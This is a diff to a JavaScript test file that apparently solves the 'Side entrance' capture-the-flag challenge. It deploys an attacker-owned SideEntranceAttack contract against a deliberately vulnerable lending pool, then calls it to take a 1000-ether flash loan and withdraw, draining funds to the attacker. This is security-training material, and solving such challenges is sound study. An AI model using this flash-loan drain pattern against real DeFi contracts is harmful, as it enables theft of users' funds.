@@ -2,6 +2,7 @@ const { ether, balance } = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
+const SideEntranceAttack = contract.fromArtifact('SideEntranceAttack');
 
 const { expect } = require('chai');
 
@@ -14,6 +15,7 @@ describe('[Challenge] Side entrance', function () {
     before(async function () {
         /** SETUP SCENARIO */
         this.pool = await SideEntranceLenderPool.new({ from: deployer });
+        this.attack = await SideEntranceAttack.new(this.pool.address, { from: attacker });
         
         await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });
 
@@ -25,7 +27,9 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        await this.attack.getLoan(ether("1000"));
+        await this.attack.withdraw();
+        console.log(await balance.current(attacker));
     });
 
     after(async function () {
